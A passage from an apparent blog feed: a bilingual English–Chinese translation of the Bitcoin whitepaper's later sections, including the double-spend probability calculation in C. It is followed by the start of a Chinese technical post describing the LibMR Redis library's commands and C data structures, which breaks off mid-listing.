在这种情况下，它们将会处理收到的第一个区块，但也会保存另一个区块以防止它后续成为最长的链。该僵局的打破要等到下一个工作量证明被发现，而其中的一条链条被证实为较长的一条，那么在另一条分支链条上工作的节点将转换阵营，开始在较长的链条上工作。</p><p>New transaction broadcasts do not necessarily need to reach all nodes. As long as they reach many nodes, they will get into a block before long. Block broadcasts are also tolerant of dropped messages. If a node does not receive a block, it will request it when it receives the next block and realizes it missed one.</p><p>新的交易广播不一定需要到达所有节点。 只要它们到达很多节点，它们很快就会进入一个区块。 块广播也可以容忍丢失消息。 如果一个节点没有收到一个块，它会在收到下一个块时意识到它错过了一个块并请求获取它。</p><h2 id="6、激励"><a href="#6、激励" class="headerlink" title="6、激励"></a>6、激励</h2><p>By convention, the first transaction in a block is a special transaction that starts a new coin owned by the creator of the block. This adds an incentive for nodes to support the network, and provides a way to initially distribute coins into circulation, since there is no central authority to issue them. The steady addition of a constant of amount of new coins is analogous to gold miners expending resources to add gold to circulation. In our case, it is CPU time and electricity that is expended.</p><p>按照惯例，区块中的第一笔交易是一项特殊交易，它产生了一枚由该区块创建者拥有的新的电子货币。这样就增加了节点支持该网络的激励，并在没有中央机构来发行他们的情况下，提供了一种将电子货币分配到流通领域的一种方法。这种将一定数量的新货币持续增添到货币系统中的方法，类似于黄金矿工消耗资源挖掘金矿来增加黄金的流通量。在这歌场景中，我们消耗的是 CPU 时间和电力。</p><p>The incentive can also be funded with transaction fees. If the output value of a transaction is less than its input value, the difference is a transaction fee that is added to the incentive value of the block containing the transaction. Once a predetermined number of coins have entered circulation, the incentive can transition entirely to transaction fees and be completely inflation free.</p><p>另一个激励的来源则是交易费用。 如果某笔交易的输出值小于其输入值，则差额就是交易费用，该费用会添加到包含该交易的区块的激励值中。 一旦预定数量的代币开始流通，那么激励机制就可以逐渐转换为完全依靠交易费，以至于能够避免出现通货膨胀。</p><p>The incentive may help encourage nodes to stay honest. If a greedy attacker is able to assemble more CPU power than all the honest nodes, he would have to choose between using it to defraud people by stealing back his payments, or using it to generate new coins. He ought to find it more profitable to play by the rules, such rules that favour him with more new coins than everyone else combined, than to undermine the system and the validity of his own wealth.</p><p>激励系统也有助于鼓励节点保持诚实。 如果一个贪婪的攻击者能够聚集比所有诚实节点更多的 CPU 能力，那么他就面临一个选择：要么将其用于诚实工作产生新的电子货币，或者将其用于进行二次支付攻击。那么他就会发现，遵守规则更有利可图，这些规则有利于他获得比其他人加起来更多的新硬币，而不是破坏系统使其自身财富的有效性受损。</p><h2 id="7、回收硬盘空间"><a href="#7、回收硬盘空间" class="headerlink" title="7、回收硬盘空间"></a>7、回收硬盘空间</h2><p>Once the latest transaction in a coin is buried under enough blocks, the spent transactions before it can be discarded to save disk space. To facilitate this without breaking the block’s hash, transactions are hashed in a Merkle Tree [7] [2] [5], with only the root included in the block’s hash. Old blocks can then be compacted by stubbing off branches of the tree. The interior hashes do not need to be stored.</p><p>如果最近的交易已经被纳入了足够多的区块之中，那么就可以丢弃该交易之前的数据以回收硬盘空间。为了同时确保不损害区块的随机散列值，交易信息被随机散列后构建成一 种 Merkle 树 [7]  [2] [5] 的形态，只有根包含在区块的哈希中。 然后可以通过砍掉树的分支来压缩旧块。 不需要存储内部散列。</p><div><p><img src="/assets/images/bitcoin-4.png" loading="lazy"></p></div><p>A block header with no transactions would be about 80 bytes. If we suppose blocks are generated every 10 minutes, 80 bytes * 6 * 24 * 365 &#x3D; 4.2MB per year. With computer systems typically selling with 2GB of RAM as of 2008, and Moore’s Law predicting current growth of 1.2GB per year, storage should not be a problem even if the block headers must be kept in memory.</p><p>一个没有交易的区块头大约有 80 个字节。 如果我们假设每 10 分钟生成一次块，则每年 80 字节 * 6 * 24 * 365 &#x3D; 4.2MB。 截至 2008 年，计算机系统通常配备 2GB RAM，并且摩尔定律预测当前每年增长 1.2GB，因此即使块头必须保存在内存中，存储也应该不是问题。</p><h2 id="8、简化付款验证"><a href="#8、简化付款验证" class="headerlink" title="8、简化付款验证"></a>8、简化付款验证</h2><p>It is possible to verify payments without running a full network node. A user only needs to keep a copy of the block headers of the longest proof-of-work chain, which he can get by querying network nodes until he’s convinced he has the longest chain, and obtain the Merkle branch linking the transaction to the block it’s timestamped in. He can’t check the transaction for himself, but by linking it to a place in the chain, he can see that a network node has accepted it, and blocks added after it further confirm the network has accepted it.</p><p>可以在不运行完整网络节点的情况下验证支付。 用户只需要保留一份最长工作量证明链的区块头副本，它就可以不断通过查询网络节点，直到它确信它拥有最长的链，并能够通过 Merkle 的分支通向它被加上时间戳并纳入区块的那次交易。节点想要自行检验该交易的有效性是不可能的，但是通过追溯到链条的某个位置，它就能看到某个节点曾经接受过它，并在进一步确认网络已接受后续添加的区块。</p><div><p><img src="/assets/images/bitcoin-5.png" loading="lazy"></p></div><p>As such, the verification is reliable as long as honest nodes control the network, but is more vulnerable if the network is overpowered by an attacker. While network nodes can verify transactions for themselves, the simplified method can be fooled by an attacker’s fabricated transactions for as long as the attacker can continue to overpower the network. One strategy to protect against this would be to accept alerts from network nodes when they detect an invalid block, prompting the user’s software to download the full block and alerted transactions to confirm the inconsistency. Businesses that receive frequent payments will probably still want to run their own nodes for more independent security and quicker verification.</p><p>因此，只要诚实节点控制网络，校验机制就是可靠的，如果网络被攻击者制伏则更容易受到攻击。 虽然网络节点可以自己验证交易，但只要攻击者可以继续压倒网络，简化的方法就可以被攻击者伪造的交易所愚弄。 防止这种情况的一种策略是在网络节点检测到无效块时接受来自网络节点的警报，提示用户的软件下载完整块和警报交易以确认不一致。 经常收到付款的企业可能仍希望运行自己的节点以获得更独立的安全性和更快的验证。</p><h2 id="9、合并和拆分值"><a href="#9、合并和拆分值" class="headerlink" title="9、合并和拆分值"></a>9、合并和拆分值</h2><p>Although it would be possible to handle coins individually, it would be unwieldy to make a separate transaction for every cent in a transfer. To allow value to be split and combined, transactions contain multiple inputs and outputs. Normally there will be either a single input from a larger previous transaction or multiple inputs combining smaller amounts, and at most two outputs: one for the payment, and one returning the change, if any, back to the sender.</p><p>尽管可以单独处理硬币，但为转账中的每一分钱都进行单独交易会很笨拙。 为了允许拆分和组合价值，交易包含多个输入和输出。 通常会有来自先前较大交易的单个输入或组合较小金额的多个输入，并且最多有两个输出：一个用于支付，另一个将找零（如果有）返回给发送者。</p><div><p><img src="/assets/images/bitcoin-6.png" loading="lazy"></p></div><p>It should be noted that fan-out, where a transaction depends on several transactions, and those transactions depend on many more, is not a problem here. There is never the need to extract a complete standalone copy of a transaction’s history.</p><p>应该注意的是，扇出（一个事务依赖于多个事务，而这些事务又依赖于更多事务）在这里不是问题。 永远不需要获取交易历史的完整独立副本。</p><h2 id="10、隐私"><a href="#10、隐私" class="headerlink" title="10、隐私"></a>10、隐私</h2><p>The traditional banking model achieves a level of privacy by limiting access to information to the parties involved and the trusted third party. The necessity to announce all transactions publicly precludes this method, but privacy can still be maintained by breaking the flow of information in another place: by keeping public keys anonymous. The public can see that someone is sending an amount to someone else, but without information linking the transaction to anyone. This is similar to the level of information released by stock exchanges, where the time and size of individual trades, the “tape”, is made public, but without telling who the parties were.</p><p>传统的银行业务模型通过限制相关方和受信任的第三方对信息的访问来实现一定程度的隐私。但是如果将交易信息向全网进行广播，就意味着这样的方法失效了，但是隐私依然可以得到保护：将公钥保持为匿名。公众可以看到有人正在向其他人汇款，但是很难将交易同特定的人联系在一起。这类似于证券交易所发布的信息级别，其中公开了个人交易的时间和大小，即 “录音带” ，但没有说明当事人是谁。</p><div><p><img src="/assets/images/bitcoin-7.png" loading="lazy"></p></div><p>As an additional firewall, a new key pair should be used for each transaction to keep them from being linked to a common owner. Some linking is still unavoidable with multi-input transactions, which necessarily reveal that their inputs were owned by the same owner. The risk is that if the owner of a key is revealed, linking could reveal other transactions that belonged to the same owner.</p><p>作为额外的防火墙，每个交易都应该使用一个新的密钥对，以防止它们被链接到一个共同的所有者。 对于多输入交易，一定程度的追溯仍然是不可避免的，这必然表明它们的输入属于同一所有者。 风险在于，如果所有者的密钥被泄露，那么就可以追溯出此人的其它很多交易。</p><h2 id="11、计算"><a href="#11、计算" class="headerlink" title="11、计算"></a>11、计算</h2><p>We consider the scenario of an attacker trying to generate an alternate chain faster than the honest chain. Even if this is accomplished, it does not throw the system open to arbitrary changes, such as creating value out of thin air or taking money that never belonged to the attacker. Nodes are not going to accept an invalid transaction as payment, and honest nodes will never accept a block containing them. An attacker can only try to change one of his own transactions to take back money he recently spent.</p><p>我们考虑攻击者试图生成比诚实链更快的替代链的场景。 即使做到了这一点，这也不会使系统能够接受任意的更改，例如凭空创造价值或拿走不属于攻击者的钱。 这是因为节点不会接受无效的交易，而诚实的节点永远不会接受一个包含了无效信息的区块。一个攻击者能做的，最多是更改他自己的交易信息，并试图拿回他刚刚付给别人的钱。</p><p>The race between the honest chain and an attacker chain can be characterized as a Binomial Random Walk. The success event is the honest chain being extended by one block, increasing its lead by +1, and the failure event is the attacker’s chain being extended by one block, reducing the gap by -1.</p><p>诚实链和攻击者链之间的竞争可以被描述为二叉树随机漫步（Binomial Random Walk）。 成功事件是诚实链被延长一个区块，领先优势增加一，失败事件是攻击者的链被延长一个区块，差距减少一。</p><p>The probability of an attacker catching up from a given deficit is analogous to a Gambler’s Ruin problem. Suppose a gambler with unlimited credit starts at a deficit and plays potentially an infinite number of trials to try to reach breakeven. We can calculate the probability he ever reaches breakeven, or that an attacker ever catches up with the honest chain, as follows [8]:</p><p>攻击者成功填补某一既定差距的可能性，可以近似地看做赌徒破产问题（Gambler’s Ruin problem）。假定一个赌徒拥有无限的透支信用，然后开始进行潜在次数为无穷的赌博，试图填补上自己的亏空。那么我们可以计算他填补上亏空的概率，也就是该攻击者赶上诚实链条， 如下所示 [8] ：</p><ul><li>p &#x3D; probability an honest node finds the next block</li><li>q &#x3D; probability the attacker finds the next block</li><li>qz &#x3D; probability the attacker will ever catch up from z blocks behind</li></ul><br /><ul><li>p &#x3D; 诚实节点制造出下一个节点的概率</li><li>q &#x3D; 攻击者制造出下一个节点的概率</li><li>qz &#x3D; 攻击者最终消弭了z个区块的落后差距</li></ul><div><p><img src="/assets/images/bitcoin-8.png" loading="lazy"></p></div><p>Given our assumption that p &gt; q, the probability drops exponentially as the number of blocks the attacker has to catch up with increases. With the odds against him, if he doesn’t make a lucky lunge forward early on, his chances become vanishingly small as he falls further behind.</p><p>假定 p &gt; q，那么攻击成功的概率就因为区块数的增长而呈现指数化下降。由于概率是攻击者的敌人，如果他不能幸运且快速地获得成功，那么他获得成功的机会随着时间的流逝就变得愈发渺茫。</p><p>We now consider how long the recipient of a new transaction needs to wait before being sufficiently certain the sender can’t change the transaction. We assume the sender is an attacker who wants to make the recipient believe he paid him for a while, then switch it to pay back to himself after some time has passed. The receiver will be alerted when that happens, but the sender hopes it will be too late.</p><p>那么我们考虑一个收款人需要等待多长时间，才能足够确信付款人已经难以更改交易了。我们假设付款人是一个支付攻击者，希望让收款人在一段时间内相信他已经付过款了， 然后立即将支付的款项重新支付给自己。虽然收款人届时会发现这一点，但为时已晚。</p><p>The receiver generates a new key pair and gives the public key to the sender shortly before signing. This prevents the sender from preparing a chain of blocks ahead of time by working on it continuously until he is lucky enough to get far enough ahead, then executing the transaction at that moment. Once the transaction is sent, the dishonest sender starts working in secret on a parallel chain containing an alternate version of his transaction.</p><p>收款人生成了新的一对密钥组合，然后只预留一个较短的时间将公钥发送给付款人。这将可以防止以下情况：付款人预先准备好一个区块链然后持续地对此区块进行运算，直到运气让他的区块链超越了诚实链条，方才立即执行支付。当此情形，只要交易一旦发出，攻击者就开始秘密地准备一条包含了该交易替代版本的平行链条。</p><p>The recipient waits until the transaction has been added to a block and z blocks have been linked after it. He doesn’t know the exact amount of progress the attacker has made, but assuming the honest blocks took the average expected time per block, the attacker’s potential progress will be a Poisson distribution with expected value:</p><p>然后收款人将等待交易出现在首个区块中，然后在等到z个区块链接其后。此时，他仍然不能确切知道攻击者已经进展了多少个区块，但是假设诚实区块将耗费平均预期时间以产生一个区块，那么攻击者的潜在进展就是一个泊松分布，分布的期望值为：</p><div><p><img src="/assets/images/bitcoin-9.png" loading="lazy"></p></div><p>To get the probability the attacker could still catch up now, we multiply the Poisson density for each amount of progress he could have made by the probability he could catch up from that point:</p><p>当此情形，为了计算攻击者追赶上的概率，我们将攻击者取得进展区块数量的泊松分布的概率密度，乘以在该数量下攻击者依然能够追赶上的概率。</p><div><p><img src="/assets/images/bitcoin-10.png" loading="lazy"></p></div><p>Rearranging to avoid summing the infinite tail of the distribution…</p><p>化为如下形式，避免对无限数列求和：</p><div><p><img src="/assets/images/bitcoin-11.png" loading="lazy"></p></div><p>Converting to C code…</p><p>写为如下C语言代码：</p><div><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-type">double</span> <span class="hljs-title function_">AttackerSuccessProbability</span><span class="hljs-params">(<span class="hljs-type">double</span> q, <span class="hljs-type">int</span> z)</span><br>&#123;<br>    <span class="hljs-type">double</span> p = <span class="hljs-number">1.0</span> - q;<br>    <span class="hljs-type">double</span> lambda = z * (q / p);<br>    <span class="hljs-type">double</span> sum = <span class="hljs-number">1.0</span>;<br>    <span class="hljs-type">int</span> i, k;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt;= z; k++)<br>    &#123;<br>        <span class="hljs-type">double</span> poisson = <span class="hljs-built_in">exp</span>(-lambda);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= k; i++)<br>            poisson *= lambda / i;<br>        sum -= poisson * (<span class="hljs-number">1</span> - <span class="hljs-built_in">pow</span>(q / p, z - k));<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure></div><p>Running some results, we can see the probability drop off exponentially with z.</p><p>对其进行运算，我们可以得到如下的概率结果，发现概率对 z 值呈指数下降。</p><div><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">q=0.1<br>z=0 P=1.0000000<br>z=1 P=0.2045873<br>z=2 P=0.0509779<br>z=3 P=0.0131722<br>z=4 P=0.0034552<br>z=5 P=0.0009137<br>z=6 P=0.0002428<br>z=7 P=0.0000647<br>z=8 P=0.0000173<br>z=9 P=0.0000046<br>z=10 P=0.0000012<br>q=0.3<br>z=0 P=1.0000000<br>z=5 P=0.1773523<br>z=10 P=0.0416605<br>z=15 P=0.0101008<br>z=20 P=0.0024804<br>z=25 P=0.0006132<br>z=30 P=0.0001522<br>z=35 P=0.0000379<br>z=40 P=0.0000095<br>z=45 P=0.0000024<br>z=50 P=0.0000006<br></code></pre></td></tr></table></figure></div><p>Solving for P less than 0.1%…</p><p>求解令 P 小于 0.1% 的 z 值：</p><div><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">P &lt; 0.001<br>q=0.10 z=5<br>q=0.15 z=8<br>q=0.20 z=11<br>q=0.25 z=15<br>q=0.30 z=24<br>q=0.35 z=41<br>q=0.40 z=89<br>q=0.45 z=340<br></code></pre></td></tr></table></figure></div><h2 id="12、结论"><a href="#12、结论" class="headerlink" title="12、结论"></a>12、结论</h2><p>We have proposed a system for electronic transactions without relying on trust. We started with the usual framework of coins made from digital signatures, which provides strong control of ownership, but is incomplete without a way to prevent double-spending. To solve this, we proposed a peer-to-peer network using proof-of-work to record a public history of transactions that quickly becomes computationally impractical for an attacker to change if honest nodes control a majority of CPU power. The network is robust in its unstructured simplicity. Nodes work all at once with little coordination. They do not need to be identified, since messages are not routed to any particular place and only need to be delivered on a best effort basis. Nodes can leave and rejoin the network at will, accepting the proof-of-work chain as proof of what happened while they were gone. They vote with their CPU power, expressing their acceptance of valid blocks by working on extending them and rejecting invalid blocks by refusing to work on them. Any needed rules and incentives can be enforced with this consensus mechanism.</p><p>我们在此提出了一种不需要信用中介的电子支付系统。我们首先讨论了通常的电子货币的电子签名原理，虽然这种系统为所有权提供了强有力的控制，但是不足以防止双重支付。为了解决这个问题，我们提出了一种采用工作量证明机制的点对点网络来记录交易的公开信息，只要诚实的节点能够控制绝大多数的 CPU 计算能力，就能使得攻击者事实上难以改变交易记录。该网络的强健之处在于它结构上的简洁性。节点之间的工作大部分是彼此独立的，只需要很少的协同。每个节点都不需要明确自己的身份，由于交易信息的流动路径并无任何要求，所以只需要尽其最大努力传播即可。节点可以随时离开网络，而想重新加入网络也非常容易，因为只需要补充接收离开期间的工作量证明链条即可。节点通过自己的 CPU 计算力进行投票，表决他们对有效区块的确认，他们不断延长有效的区块链来表达自己的确认，并拒绝在无效的区块之后延长区块以表示拒绝。本框架包含了一个 P2P 电子货币系统所需要的全部规则和激励措施。</p><h2 id="13、参考"><a href="#13、参考" class="headerlink" title="13、参考"></a>13、参考</h2><div><p>[1] W. Dai, “b-money,” <a href="http://www.weidai.com/bmoney.txt">http://www.weidai.com/bmoney.txt</a>, 1998<br>[2] H. Massias, X.S. Avila, and J.-J. Quisquater, “Design of a secure timestamping service with minimal trust requirements,” In 20th Symposium on Information Theory in the Benelux, May 1999.<br>[3] S. Haber, W.S. Stornetta, “How to time-stamp a digital document,” In Journal of Cryptology, vol 3, no 2, pages 99-111, 1991.<br>[4] D. Bayer, S. Haber, W.S. Stornetta, “Improving the efficiency and reliability of digital time-stamping,” In Sequences II: Methods in Communication, Security and Computer Science, pages 329-334, 1993.<br>[5] S. Haber, W.S. Stornetta, “Secure names for bit-strings,” In Proceedings of the 4th ACM Conference on Computer and Communications Security, pages 28-35, April 1997.<br>[6] A. Back, “Hashcash - a denial of service counter-measure,” <a href="http://www.hashcash.org/papers/hashcash.pdf">http://www.hashcash.org/papers/hashcash.pdf</a>, 2002.<br>[7] R.C. Merkle, “Protocols for public key cryptosystems,” In Proc. 1980 Symposium on Security and Privacy, IEEE Computer Society, pages 122-133, April 1980.<br>[8] W. Feller, “An introduction to probability theory and its applications,” 1957.</p><div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><div><ul><li><a href="https://nakamotoinstitute.org/static/docs/bitcoin-zh-cn.pdf">https://nakamotoinstitute.org/static/docs/bitcoin-zh-cn.pdf</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 区块链 </category>
          
          <category> 比特币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比特币 </tag>
            
            <tag> 区块链 </tag>
            
            <tag> 论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis相关库学习 - LibMR</title>
      <link href="/2022/10/22/redislibrary-libmr/"/>
      <url>/2022/10/22/redislibrary-libmr/</url>
      
        <content type="html"><![CDATA[<p><code>LibMR</code> 是一款适用于 Redis 集群的 <code>Map Reduce</code> （分发Redis命令并获取结果）的依赖库。它基于 libevent 的事件机制，通过使用多个线程池来分发异步任务，目前已经被 <code>RedisTimeSeries</code> 等模块使用。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/RedisGears/LibMR">https://github.com/RedisGears/LibMR</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><p>由于该依赖库在编译时可以设置自定义的 <code>modulename</code> ，因此可以避免在不同模块中使用的冲突。</p><ul><li>modulename.INNERCOMMUNICATION : 从其他分片中获取消息；</li><li>modulename.HELLO : 获取当前实例的集群id，仅集群模式下才可以调用；</li><li>modulename.REFRESHCLUSTER : 更新当前集群的拓扑信息</li><li>modulename.CLUSTERSET : 强制设置集群的拓扑信息，该信息只会更改该依赖库中记录的拓扑信息，并不会影响实际的 Redis 集群；</li><li>modulename.CLUSTERSETFROMSHARD : 与 <code>*.CLUSTERSET</code> 命令类似，该命令为非强制的，即如果已知的集群信息非空则不会设置；</li><li>modulename.INFOCLUSTER : 返回记录的当前集群的拓扑信息；</li><li>modulename.NETWORKTEST : 向记录的集群的所有节点发送 <code>test msg</code> 消息；</li></ul><p><strong>以上命令的实现逻辑基本上都是：</strong></p><ul><li>阻塞当前调用客户端 （ &#96;&#96;RedisModule_BlockClient&#96; 函数）；</li><li>新增并立刻激活事件，调用相关函数处理相关逻辑；</li><li>取消阻塞并回复客户端 （ <code>RedisModule_UnblockClient</code> 函数）；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><h4 id="2-2-1、全局数据结构"><a href="#2-2-1、全局数据结构" class="headerlink" title="2.2.1、全局数据结构"></a>2.2.1、全局数据结构</h4><p>全局的数据结构记录了所有需要执行的任务信息，在使用该依赖库之前必须将其初始化。</p><p><strong>相关的初始化函数：</strong></p><ul><li>MR_Init : 初始化全局 <code>mrCtx</code> 结构体；</li><li>MR_RegisterObject : 注册自定义的对象类型，对应 <code>mrCtx</code> 中的 <code>objectTypesDict</code> 成员变量；</li><li>MR_RegisterReader : 注册自定义的读取器，对应 <code>mrCtx</code> 中的 <code>readerDict</code> 成员变量；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 全局变量</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_thpool_</span>* <span class="hljs-title">mr_threadpool</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MRCtx</span> &#123;</span><br>    <span class="hljs-type">size_t</span> lastExecutionId;             <span class="hljs-comment">// 执行ID，每创建一个任务时该执行ID加1</span><br>    mr_dict* executionsDict;            <span class="hljs-comment">// 执行器集合，任务开始时加入，结束时移除</span><br>    MRObjectType** objectTypesDict;     <span class="hljs-comment">// 自定义的对象集合，开始时初始化，并且后续保持不变</span><br><br>    mr_dict* readerDict;                <span class="hljs-comment">// 注册的读集合</span><br>    mr_dict* mappersDict;               <span class="hljs-comment">// 注册的映射集合</span><br>    mr_dict* filtersDict;               <span class="hljs-comment">// 注册的过滤器集合</span><br>    mr_dict* accumulatorsDict;          <span class="hljs-comment">// 注册的累加器集合</span><br>    mr_threadpool executionsThreadPool; <span class="hljs-comment">// 线程池指针</span><br>    MRStats stats;                      <span class="hljs-comment">// 执行状态</span><br>&#125; mrCtx;<br><br><span class="hljs-comment">// 全局状态</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MRStats</span> &#123;</span><br>    <span class="hljs-type">size_t</span> nMissedExecutions;   <span class="hljs-comment">// 找不到对应执行器的计数</span><br>    <span class="hljs-type">size_t</span> nMaxIdleReached;     <span class="hljs-comment">// 执行超时的计数</span><br>&#125; MRStats;<br><br><span class="hljs-comment">// 自定义对象类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MRObjectType</span> &#123;</span><br>    <span class="hljs-type">char</span>* type;<br>    <span class="hljs-type">size_t</span> id;<br>    ObjectFree <span class="hljs-built_in">free</span>;<br>    ObjectDuplicate dup;<br>    ObjectSerialize serialize;<br>    ObjectDeserialize deserialize;<br>    ObjectToString tostring;<br>&#125; MRObjectType;<br></code></pre></td></tr></table></figure><h4 id="2-2-2、任务执行数据结构"><a href="#2-2-2、任务执行数据结构" class="headerlink" title="2.2.2、任务执行数据结构"></a>2.2.2、任务执行数据结构</h4><p>引用该依赖库 Redis 模块可以通过调用 <code>MR_Run</code> 函数来执行自定义的任务（向集群中的任意分片发送命令），在任务的执行过程中需要使用到以下的数据结构。</p><p><strong>相关的执行函数：</strong></p><ul><li>MR_Run : 外部调用的任务执行入口；</li><li>MR_RunExecution : 任务不在集群中执行时调用；</li><li>MR_ExecutionDistribute : 任务需要在集群中执行时调用；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REDISMODULE_NODE_ID_LEN  40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ID_LEN                   REDISMODULE_NODE_ID_LEN + sizeof(size_t)  <span class="hljs-comment">// 48个字节</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STR_ID_LEN               REDISMODULE_NODE_ID_LEN + 13</span><br><br><span class="hljs-comment">// 执行任务</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Execution</span> &#123;</span><br>    <span class="hljs-type">int</span> flags;               <span class="hljs-comment">// 特征Flag，目前有两个特征：已经初始化，仅本地执行的命令</span><br>    <span class="hljs-type">size_t</span> refCount;         <span class="hljs-comment">// 引用计数</span><br>    <span class="hljs-type">char</span> id[ID_LEN];         <span class="hljs-comment">// 执行ID值，前40个字节记录实例ID，后8个字节记录递增的任务ID</span><br>    <span class="hljs-type">char</span> idStr[STR_ID_LEN];  <span class="hljs-comment">// 执行ID值，格式为 %40s-%lld</span><br>    Step* steps;             <span class="hljs-comment">// 执行任务的步骤，容量为10</span><br>    <span class="hljs-type">pthread_mutex_t</span> eLock;   <span class="hljs-comment">// 关键步骤所需要的锁</span><br>    mr_list* tasks;          <span class="hljs-comment">// 执行的任务列表</span><br><br>    <span class="hljs-type">size_t</span> nRecieved;        <span class="hljs-comment">// 收到的回复计数，相关函数: MR_AckExecution</span><br>    <span class="hljs-type">size_t</span> nCompleted;       <span class="hljs-comment">// 完成计数，相关函数: MR_NotifyDone</span><br>    Record** results;        <span class="hljs-comment">// 结果集，容量为10</span><br>    Record** errors;         <span class="hljs-comment">// 错误结果集，容量为10</span><br><br>    ExecutionCallbacks callbacks;  <span class="hljs-comment">// 回调函数</span><br>    MR_LoopTaskCtx* timeoutTask;   <span class="hljs-comment">// 执行超时的任务</span><br>    <span class="hljs-type">size_t</span> timeoutMS;              <span class="hljs-comment">// 任务执行超时时间，默认5s</span><br>&#125;;<br><br><span class="hljs-comment">// 执行任务的步骤</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Step</span> &#123;</span><br>    <span class="hljs-type">int</span> flags;<br>    ExecutionBuilderStep bStep;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        MapStep <span class="hljs-built_in">map</span>;<br>        FilterStep filter;<br>        ReadStep read;<br>        CollectStep collect;<br>        ReshuffleStep reshuffle;<br>        AccumulateStep accumulate;<br>    &#125;;<br>    <span class="hljs-type">size_t</span> index;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Step</span>* <span class="hljs-title">child</span>;</span><br>&#125;;<br><br><span class="hljs-comment">// 执行的任务列表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_list</span> &#123;</span><br>    mr_listNode *head;<br>    mr_listNode *tail;<br>    <span class="hljs-type">void</span> *(*dup)(<span class="hljs-type">void</span> *ptr);<br>    <span class="hljs-type">void</span> (*<span class="hljs-built_in">free</span>)(<span class="hljs-type">void</span> *ptr);<br>    <span class="hljs-type">int</span> (*match)(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">void</span> *key);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;<br>&#125; mr_list;<br><br><span class="hljs-comment">// 执行任务的回调函数</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ExecutionCallbacks</span> &#123;</span><br>    ExecutionCallbackData done;<br>    ExecutionCallbackData resume;<br>    ExecutionCallbackData hold;<br>&#125; ExecutionCallbacks;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ExecutionCallbackData</span> &#123;</span><br>    <span class="hljs-type">void</span>* pd;<br>    ExecutionCallback callback;<br>&#125; ExecutionCallbackData;<br></code></pre></td></tr></table></figure><h4 id="2-2-3、线程池数据结构"><a href="#2-2-3、线程池数据结构" class="headerlink" title="2.2.3、线程池数据结构"></a>2.2.3、线程池数据结构</h4><p>线程池中包含许多要执行的任务，下面列出了关于线程池中一个任务相关的数据结构。由于多个线程同时消费一个任务队列，因此需要加锁处理。</p><p><strong>线程池的相关函数：</strong></p><ul><li>mr_thpool_init : 线程初始化，由函数 MR_Init 调用；</li><li>mr_thpool_add_work : 线程池中新增任务；</li><li>mr_thpool_destroy : 销毁线程池中任务；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 线程</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_thread</span> &#123;</span><br>    <span class="hljs-type">int</span> id;                      <span class="hljs-comment">// 外部指定的线程索引</span><br>    <span class="hljs-type">pthread_t</span> pthread;           <span class="hljs-comment">// 线程指针</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_thpool_</span>* <span class="hljs-title">thpool_p</span>;</span> <span class="hljs-comment">// 线程池指针</span><br>&#125; mr_thread;<br><br><span class="hljs-comment">// 线程池</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mr_thpool_</span> &#123;</span><br>    mr_thread** threads;              <span class="hljs-comment">// 线程指针数组</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> num_threads_alive;   <span class="hljs-comment">// 存活的线程数</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> num_threads_working; <span class="hljs-comment">// 工作的线程数</span><br>    <span class="hljs-type">pthread_mutex_t</span> thcount_lock;     <span class="hljs-comment">// 